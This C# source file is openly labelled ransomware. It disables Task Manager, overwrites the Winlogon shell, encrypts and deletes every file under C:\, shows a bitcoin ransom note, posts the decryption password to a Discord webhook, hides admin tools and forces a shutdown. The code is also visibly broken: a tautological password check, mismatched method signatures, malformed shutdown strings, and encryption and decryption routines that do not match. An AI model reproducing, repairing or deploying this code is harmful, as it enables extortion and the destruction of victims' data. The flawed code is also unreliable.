using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using Microsoft.Win32;
using System.Net.Http;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Ransomware
{
    class Program
    {
        static async Task Main(string[] args)
        {
            //Disable a bunch of stuff
        
            //Disable taskmanager
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"); 
            reg.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
            //Remove wallpaper
            RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
            reg2.SetValue("Wallpaper", "", RegistryValueKind.String);
            //If the computer restarts, it won't work very well
            RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg3.SetValue("Shell", "empty", RegistryValueKind.String);

            tmr_if.Start();

            
            string directory = @"C:\";
            string[] files = Directory.GetFiles(directory, "*", SearchOption.AllDirectories);

            string password = GenerateRandomPassword(); // generate a random password
            string transactionId = GenerateRandomTransactionId(); // generate a random transaction ID
            int attemptsRemaining = 3; // number of attempts remaining
            DateTime expirationTime = DateTime.Now.AddDays(3); // set the expiration time to 3 days from now

            foreach (string file in files)
            {
                EncryptFile(file, password);
            }

            string message = $"Ooops! :(       All your files have been encrypted with a military grade encryption password. To get the password, send me <money #> to this bitcoin address. : <Bitcoin Address>. Once you have sent the money, send me a message at <website> with the transaction ID of ({transactionId}) and you will get the password to decrypt your files. You have 3 days to do so, after which the password will no longer be accepted, and you cannot decrypt your files anymore! Do not try and restart your computer, and if you do, you'll regret it very much.";
            MessageBox.Show(message, "Message Box Title", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, (MessageBoxOptions)0x40000 | MessageBoxOptions.ServiceNotification);



            // send the password and transactionID to a discord webhook
            await SendToDiscordWebhook(password, transactionId);

            bool passwordMatched = false;
            while (!passwordMatched && attemptsRemaining > 0 && DateTime.Now < expirationTime)
            {
                password = await GetPasswordFromUser();
                attemptsRemaining--;

                if (password == password) // check if the password is correct
                {
                    foreach (string file in files)
                    {
                        if (DecryptFile(file, password))
                        {
                            passwordMatched = true;
                        }
                    }
                }

                if (!passwordMatched && attemptsRemaining > 0 && DateTime.Now < expirationTime)
                {
                    MessageBox.Show($"Incorrect password! {attemptsRemaining} attempts remaining. Please try again.");
                }
            }

            if (passwordMatched)
            {
                MessageBox.Show("All files have been successfully decrypted.");
            }
            else if (DateTime.Now >= expirationTime)
            {
                MessageBox.Show("The password is no longer accepted. You have exceeded the time limit of 3 days.");
                Process.Start("shutdown","/s /t 60 /c "Hope you learned your lesson! Anyways, you only have 60 seconds left of your computers functionality");
            }
            else
            {
                MessageBox.Show("No attempts remaining!");
                Process.Start("shutdown","/s /t 60 /c "Enjoy the last 60 seconds of your computer");
            }
        }

         private void tmr_if_Tick(object sender, EventArgs e)
        {
            tmr_if.Stop();
            int hWnd;
            Process[] processRunning = Process.GetProcesses();
            foreach (Process pr in processRunning)
            {
                if (pr.ProcessName == "cmd")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }

                if (pr.ProcessName == "regedit")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }

                if (pr.ProcessName == "Processhacker")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }

                if (pr.ProcessName == "sdclt")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }
            }


         static async Task SendToDiscordWebhook(string message, string password, string transactionId)
        {
            string webhookUrl = "YOUR-WEBHOOK-HERE";

            // create a JSON payload with the message, password and transaction ID
            var payload = new
            {
                content = $"\nPassword: `{password}`\nTransaction ID: `{transactionId}`"
            };
            string payloadJson = JsonSerializer.Serialize(payload);

            // send the payload to the webhook URL
            using (var httpClient = new HttpClient())
            {
                var response = await httpClient.PostAsync(webhookUrl, new StringContent(payloadJson, System.Text.Encoding.UTF8, "application/json"));
                response.EnsureSuccessStatusCode();
            }
        }

 
        static string GenerateRandomPassword()
        {
            const string validChars = "ABCDEFGHJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_-+={}[]\\|:;<>,.?/~`";
            StringBuilder password = new StringBuilder();
            Random random = new Random();

            while (password.Length < 32)
            {
                password.Append(validChars[random.Next(validChars.Length)]);
            }

            return password.ToString();
        }

        static string GenerateRandomTransactionId()
        {
            const string validChars = "0123456789";
            StringBuilder transactionId = new StringBuilder();
            Random random = new Random();

            while (transactionId.Length < 16)
            {
                transactionId.Append(validChars[random.Next(validChars.Length)]);
            }

            return transactionId.ToString();
        }


        static string GetPasswordFromUser()
        {
            Console.Write("Enter the password: ");

            IntPtr hwnd = GetConsoleWindow();
            if (hwnd != IntPtr.Zero)
            {
                EnableMenuItem(GetSystemMenu(hwnd, false), SC_CLOSE, MF_BYCOMMAND | MF_GRAYED);
            }

            string password = null;
            while (string.IsNullOrEmpty(password))
            {
                SecureString securePassword = new SecureString();
                ConsoleKeyInfo keyInfo;
                do
                {
                    keyInfo = Console.ReadKey(true);
                    if (keyInfo.Key != ConsoleKey.Enter && keyInfo.Key != ConsoleKey.Escape)
                    {
                        securePassword.AppendChar(keyInfo.KeyChar);
                        Console.Write("*"); // Show an asterisk for each character entered
                    }
                } while (keyInfo.Key != ConsoleKey.Enter && keyInfo.Key != ConsoleKey.Escape);

                if (keyInfo.Key == ConsoleKey.Enter)
                {
                    password = new System.Net.NetworkCredential(string.Empty, securePassword).Password;
                    Console.WriteLine();
                }
                else
                {
                    MessageBox.Show("Cannot close window! ");
                }
            }

            if (hwnd != IntPtr.Zero)
            {
                EnableMenuItem(GetSystemMenu(hwnd, false), SC_CLOSE, MF_BYCOMMAND | MF_ENABLED);
            }

            return password;
        }

        static void EncryptFile(string inputFile, string password)
        {
            byte[] salt = GenerateRandomSalt();

            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] keyBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000).GetBytes(256 / 8);
            byte[] ivBytes = GenerateRandomIV();

            using (FileStream inputStream = File.OpenRead(inputFile))
            {
                using (FileStream outputStream = File.Create(inputFile + ".encrypted"))
                {
                    outputStream.Write(salt, 0, salt.Length);
                    outputStream.Write(ivBytes, 0, ivBytes.Length);

                    using (Aes aes = Aes.Create())
                    {
                        aes.KeySize = 256;
                        aes.Key = keyBytes;
                        aes.IV = ivBytes;
                        aes.Mode = CipherMode.CBC;

                        using (CryptoStream cryptoStream = new CryptoStream(outputStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            inputStream.CopyTo(cryptoStream);
                        }
                    }
                }
            }

            File.Delete(inputFile);
        }
        static bool DecryptFile(string inputFile, string password)
    {
          if (!inputFile.EndsWith(".encrypted"))
          {
              return false;
          }

          byte[] salt = new byte[32];
          using (FileStream fs = new FileStream(inputFile, FileMode.Open))
          {
              fs.Read(salt, 0, salt.Length);
          }

          byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

          RijndaelManaged aes = new RijndaelManaged();
          aes.KeySize = 256;
          aes.BlockSize = 128;

          var key = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          aes.Key = key.GetBytes(aes.KeySize / 8);
          aes.IV = key.GetBytes(aes.BlockSize / 8);

          aes.Mode = CipherMode.CFB;

          using (FileStream fs = new FileStream(inputFile.Replace(".encrypted", ""), FileMode.Create))
          {
              using (CryptoStream cs = new CryptoStream(fs, aes.CreateDecryptor(), CryptoStreamMode.Write))
              {
                  using (FileStream fsIn = new FileStream(inputFile, FileMode.Open))
                  {
                      fsIn.Seek(salt.Length, SeekOrigin.Begin);

                      byte[] buffer = new byte[1048576];
                      int read;
                      while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                      {
                          cs.Write(buffer, 0, read);
                      }
                  }
              }
          }

          return true;
        }
    }
}
